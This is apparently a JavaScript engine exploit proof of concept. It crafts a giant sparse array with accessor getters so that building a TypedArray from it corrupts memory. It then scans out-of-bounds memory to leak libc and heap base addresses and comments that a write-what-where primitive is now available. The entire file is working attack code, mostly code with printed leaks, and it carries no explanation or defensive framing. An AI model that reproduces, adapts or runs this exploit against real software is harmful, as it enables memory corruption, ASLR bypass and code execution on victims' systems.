console.log('start');
var b = Array(2147483648);

pos = 4
for (var i = 0; i <= 0x100; ++i) {
    b[i] = 0x0;
}
b[pos] = 0x85;
b[pos + 2] = 1;
b[pos + 4] = 0x21;
b[pos + 16] = 0x201;
b[pos + 20] = 0x31;
b[pos + 24] = 1;
b[pos + 26] = 0xffff;
b[pos + 27] = 0xffff;
b[pos + 28] = 0xd;
b[pos + 30] = 0x7fff;
b[pos + 32] = 0x18;

var c = {};
var d = {};
var s;
var libc_base1, libc_base2;
var heap_base1, heap_base2;
var mmap_base1, mmap_base2;
var cur_heap_base1, cur_heap_base2;
var e;

b.__defineGetter__('0', function(idx){
	//c = new Uint32Array([0xdeeddeed,0xdeeddeed,3,4,5,6,7]);
	//return 0xaaaabbbb;
	c = new Uint32Array([0xdeadbeef, 0xbeefdead, 0xabcdabcd]);
	d = new Int32Array([0xddaaddaa, 0xdeadbeee]);
	return 0;
});

b.__defineGetter__('36', function(idx){
	
	//find the libc
	for(var idx = 2; idx < 500; idx += 2){
		var a = c[idx];
		var b = c[idx + 1];

		if(b >= 0x7f00 && b <= 0x8000 && 
			a == c[idx - 2] && b == c[idx - 1]){
			libc_base1 = a - 0x1beb00;
			libc_base2 = b;
			break;
		}
	}
	
	for(var idx = 0; idx < 500; idx += 1){
		i = 1073741823 - idx + 1; //its important here
		var a = c[i];
		var b = c[i + 1];
		if(b > 0x5500 && b <= 0x5800 &&
			c[i - 2] == 0x31){
				heap_base1 = a + 0x120;
				heap_base2 = b;
				break;
			}
	}
	
	console.log('libc : 0x' + libc_base2.toString(16) + (libc_base1 >>>0).toString(16));
	console.log('heap : 0x' + heap_base2.toString(16) + (heap_base1 >>>0).toString(16));
	console.log('god ne0');
	
	//can do write what where now	
	return 0x18;
});


b.__defineGetter__('38', function(idx) {
	throw Exception();
});


try {
	var a = new Int16Array(b);
} catch(e) {
}

console.log(d[0].toString(16))
